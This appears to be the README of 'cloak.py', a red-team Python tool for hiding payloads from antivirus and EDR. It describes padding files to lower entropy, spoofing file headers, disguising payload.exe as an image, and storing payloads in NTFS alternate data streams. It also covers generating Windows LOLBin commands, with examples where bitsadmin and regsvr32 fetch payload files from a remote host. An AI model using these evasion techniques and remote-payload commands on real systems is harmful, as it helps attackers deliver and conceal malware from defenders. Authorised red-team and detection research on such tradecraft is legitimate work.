# cloak.py

A Python red team file utility for encoding, entropy manipulation, header spoofing, alternate data streams, and LOLBin command generation.

---

## Requirements

- Python 3.9+
- Cross-platform (Windows, Linux, Mac)
- No external dependencies (stdlib only)

---

## Modes

| Mode      | Description                                                                 |
|-----------|-----------------------------------------------------------------------------|
| `info`    | Inspect a file: size, entropy score, header fingerprint, magic-byte match   |
| `util`    | Encode, lower entropy, ADS read/write, rename extension, spoof header       |
| `generate`| LOLBin command generator (Living Off the Land Binaries)                    |

---

## Encoding Techniques

When `--encode` is passed in `info` or `util` mode, an interactive menu appears:

| # | Technique         | Output type | Reversible | How to decode |
|---|-------------------|-------------|------------|---------------|
| 1 | Base64            | Text        | Yes        | Base64 decode |
| 2 | Hex               | Text        | Yes        | Hex decode    |
| 3 | XOR               | Binary      | Yes        | XOR again     |
| 4 | Reverse bytes     | Binary      | Yes        | Reverse again |
| 5 | XOR → Base64      | Text        | Yes        | Base64 decode, then XOR |
| 6 | XOR → Hex         | Text        | Yes        | Hex decode, then XOR    |
| 7 | RC4               | Binary      | Yes        | RC4 again     |

### XOR / RC4 Key Format

- XOR accepts a single byte key (hex or decimal):
	- `0x41` (hex)
	- `65`   (decimal)
- RC4 accepts a string or hex key:
	- `mysecretkey`
	- `0xDEADBEEF`

---

## Entropy Manipulation

High entropy files (> 7.2) are flagged by most AV/EDR as packed or encrypted. The `--lower-entropy` flag pads the file with structured low-entropy junk to bring the score down into a benign range before encoding.

| Entropy | Meaning              |
|---------|----------------------|
| < 6.5   | Looks benign         |
| 6.5–7.2 | Mildly suspicious    |
| > 7.2   | Almost certainly flagged |

The `info` mode always shows the entropy score with a colour-coded label.

---

## Alternate Data Streams (ADS)

Windows/NTFS only. Stores data in a named stream attached to a file — invisible to Explorer and `dir`, no change to the visible file size.

Example:
```
file.txt          ← normal file, dir shows this
file.txt:hidden   ← ADS stream, invisible to casual inspection
```

Use `dir /r` or `Get-Item -Stream *` to see streams on a file.

---

## LOLBin Generator

Generates ready-to-run commands for 18 Windows built-in binaries (Living Off the Land Binaries). Each entry includes OS compatibility and detection notes so you know what will work on the target before you try it.

---

## Parameters (Python)

| Flag            | Short | Description                                                        |
|-----------------|-------|--------------------------------------------------------------------|
| `mode`          | —     | `info` \| `util` \| `generate` *(required)*                       |
| `--carrier`     | `-c`  | Input file                                                         |
| `--output`      | `-o`  | Output file path                                                   |
| `--encode`      | `-e`  | Show interactive encoding menu                                     |
| `--decode`      | `-d`  | Show interactive decoding menu                                     |
| `--lower-entropy`| —    | Target entropy e.g. `6.0`                                          |
| `--new-extension`| `-n` | Replace all extensions (e.g. `.pdf`)                               |
| `--add-extension`| `-a` | Append to filename (e.g. `.bak`)                                   |
| `--spoof-header`| `-x`  | Overwrite header with magic bytes                                  |
| `--show-hashes` | `-H`  | Display MD5, SHA1, SHA256                                          |
| `--quiet`       | `-q`  | Suppress the banner                                                |
| `--ads-write`   | —     | Write payload into ADS on `--carrier`                             |
| `--ads-read`    | —     | Read ADS stream to `--output`                                      |
| `--ads-list`    | —     | List all ADS streams                                               |
| `--ads-delete`  | —     | Delete a named ADS stream                                          |
| `--ads-stream`  | —     | Stream name                                                       |
| `--lolbin`      | —     | LOLBin name — interactive menu if omitted                         |
| `--lolbin-file` | —     | Local payload file path                                            |
| `--lolbin-url`  | —     | Remote URL                                                        |
| `--lolbin-arg`  | —     | Extra argument                                                    |
| `--list`        | —     | List all LOLBins and exit                                         |

---

## Examples

### Inspect a file

```bash
python cloak.py info -c payload.exe --show-hashes
```

### Lower entropy then encode

```bash
python cloak.py util -c payload.exe --lower-entropy 6.0 --encode
```

### Encode + rename + spoof header

```bash
python cloak.py util -c payload.exe --encode --new-extension .jpg --spoof-header --show-hashes
```

### Write payload into ADS

```bash
python cloak.py util -c readme.txt --ads-write payload.enc --ads-stream hidden
```

### Read ADS stream back out

```bash
python cloak.py util -c readme.txt --ads-read --ads-stream hidden -o recovered.bin
```

### List all ADS streams on a file

```bash
python cloak.py util -c readme.txt --ads-list
```

### List all LOLBins

```bash
python cloak.py generate --list
```

### Generate LOLBin commands interactively

```bash
python cloak.py generate --lolbin-file payload.dll
```

### Generate specific LOLBin

```bash
python cloak.py generate --lolbin bitsadmin --lolbin-file test.txt --lolbin-url http://10.10.10.1/test.txt
```

### Save generated commands to file

```bash
python cloak.py generate --lolbin regsvr32 --lolbin-file payload.sct --lolbin-url http://10.10.10.1/p.sct -o commands.txt
```

---

## Supported Magic Bytes

| Extension | Signature |
|-----------|-----------|
| `.pdf`    | `25 50 44 46` |
| `.png`    | `89 50 4E 47 0D 0A 1A 0A` |
| `.jpg`/`.jpeg` | `FF D8 FF` |
| `.gif`    | `47 49 46 38` |
| `.zip`/`.docx`/`.xlsx`/`.pptx` | `50 4B 03 04` |
| `.7z`     | `37 7A BC AF 27 1C` |
| `.gz`     | `1F 8B` |
| `.rar`    | `52 61 72 21 1A 07` |
| `.exe`/`.dll` | `4D 5A` |
| `.elf`    | `7F 45 4C 46` |
| `.mp3`    | `49 44 33` |
| `.mp4`    | `00 00 00 18 66 74 79 70` |
| `.wav`    | `52 49 46 46` |
| `.bmp`    | `42 4D` |
| `.sqlite` | `53 51 4C 69 74 65 20 66 6F 72 6D 61 74 20 33` |
| `.class`  | `CA FE BA BE` |
| `.iso`    | `43 44 30 30 31` |

---

## Notes

- No intermediate temp files are left behind after any operation
- Original files are never modified — output always goes to a new file
- Paths with spaces are fully supported
- ADS features require Windows/NTFS — gracefully errors on Linux/Mac
- `cloak.py` requires Python 3.9 or later, no external packages needed

---

## Spoofed Header and Recovery

If you use `--spoof-header` (e.g., to make a file look like a .jpg or .png), the spoofed magic bytes will remain in the output file. This means:

- **You cannot recover the exact original file** with `--strip-padding` if you used `--spoof-header` — the header will be different.
- For perfect round-trip recovery (original = recovered), **do not use `--spoof-header`** when lowering entropy or padding files you want to restore later.
- If you only want to change the extension or lower entropy, you can safely recover the original with `--strip-padding` and the correct interval.

**Example (no spoofing, perfect recovery):**
```bash
python cloak.py util -c payload.bin --lower-entropy 6.0 --new-extension .png --output padded.png
python cloak.py util -c padded.png --strip-padding <interval> --output recovered.bin
```

**Example (with spoofing, header will differ):**
```bash
python cloak.py util -c payload.bin --lower-entropy 6.0 --new-extension .png --spoof-header --output padded_spoofed.png
python cloak.py util -c padded_spoofed.png --strip-padding <interval> --output recovered.bin
# recovered.bin will have the spoofed header, not the original
```